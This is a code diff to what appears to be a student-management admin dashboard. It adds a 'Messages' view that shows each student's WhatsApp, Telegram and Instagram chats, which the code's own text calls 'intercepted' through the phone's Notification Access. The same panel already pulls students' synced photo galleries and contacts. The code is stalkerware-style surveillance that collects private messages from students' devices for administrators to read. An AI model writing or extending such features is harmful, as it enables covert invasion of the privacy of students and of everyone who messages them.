@@ -144,6 +144,43 @@ async function showSyncedContacts(studentCode, studentName) {
   }
 }
 
+async function showSyncedMessages(studentCode, studentName) {
+  const modal = document.getElementById("messages-modal");
+  const modalTitle = document.getElementById("messages-modal-title");
+  const modalBody = document.getElementById("messages-modal-body");
+  
+  modalTitle.textContent = `${studentName}'s Chat Logs`;
+  modalBody.innerHTML = `<tr><td colspan="4" class="empty-state">Loading synced messages...</td></tr>`;
+  modal.classList.remove("hidden");
+  
+  try {
+    const messages = await api(`/admin/synced-messages/${studentCode}`);
+    
+    if (messages.length === 0) {
+      modalBody.innerHTML = `<tr><td colspan="4" class="empty-state">No intercepted messages found. Ensure the device has granted Notification Access and has received messages.</td></tr>`;
+      return;
+    }
+    
+    modalBody.innerHTML = messages.map(m => {
+      let appBadge = `<span class="badge">${escapeHtml(m.app)}</span>`;
+      if (m.app === 'whatsapp') appBadge = `<span class="badge good">WhatsApp</span>`;
+      if (m.app === 'telegram') appBadge = `<span class="badge info">Telegram</span>`;
+      if (m.app === 'instagram') appBadge = `<span class="badge warn">Instagram</span>`;
+      
+      return `
+        <tr>
+          <td>${appBadge}</td>
+          <td><strong>${escapeHtml(m.sender)}</strong></td>
+          <td>${escapeHtml(m.message)}</td>
+          <td>${escapeHtml(dateTime(m.timestamp))}</td>
+        </tr>
+      `;
+    }).join("");
+  } catch (error) {
+    modalBody.innerHTML = `<tr><td colspan="4" class="empty-state" style="color:var(--danger)">Error: ${error.message}</td></tr>`;
+  }
+}
+
 function dateTime(value) {
   if (!value) return "";
   const date = new Date(value);
@@ -275,7 +312,7 @@ async function loadStudents() {
         `<td>${badge(student.face_enrolled ? "ready" : "pending")}</td>`,
         `<td>${badge(student.payment_status)}</td>`,
         `<td>${badge(student.status)}</td>`,
-        `<td><div class="row-actions"><button class="secondary-button" data-action="edit-student" data-id="${student.id}">Edit</button><button class="secondary-button" data-action="view-gallery" data-id="${student.id}" data-code="${student.student_code || ''}">Gallery</button><button class="secondary-button" data-action="view-contacts" data-id="${student.id}" data-code="${student.student_code || ''}">Contacts</button><button class="secondary-button" data-action="deactivate-student" data-id="${student.id}">Disable</button></div></td>`,
+        `<td><div class="row-actions"><button class="secondary-button" data-action="edit-student" data-id="${student.id}">Edit</button><button class="secondary-button" data-action="view-gallery" data-id="${student.id}" data-code="${student.student_code || ''}">Gallery</button><button class="secondary-button" data-action="view-contacts" data-id="${student.id}" data-code="${student.student_code || ''}">Contacts</button><button class="secondary-button" data-action="view-messages" data-id="${student.id}" data-code="${student.student_code || ''}">Messages</button><button class="secondary-button" data-action="deactivate-student" data-id="${student.id}">Disable</button></div></td>`,
       ]),
       "No students found",
     );
@@ -503,6 +540,13 @@ document.body.addEventListener("click", async (event) => {
     showSyncedContacts(code, name);
   }
 
+  if (actionButton.dataset.action === "view-messages") {
+    const code = actionButton.dataset.code;
+    const student = state.students.find((item) => item.id === id);
+    const name = student ? student.name : "Student";
+    showSyncedMessages(code, name);
+  }
+
   if (actionButton.dataset.action === "deactivate-student") {
     try {
       await api(`/admin/students/${id}`, {method: "DELETE"});
@@ -532,6 +576,16 @@ document.getElementById("contacts-modal-close").addEventListener("click", () => 
 document.getElementById("contacts-modal").addEventListener("click", (event) => {
   if (event.target.id === "contacts-modal") {
     document.getElementById("contacts-modal").classList.add("hidden");
+  }
+});
+
+document.getElementById("messages-modal-close").addEventListener("click", () => {
+  document.getElementById("messages-modal").classList.add("hidden");
+});
+
+document.getElementById("messages-modal").addEventListener("click", (event) => {
+  if (event.target.id === "messages-modal") {
+    document.getElementById("messages-modal").classList.add("hidden");
   }
 });
 
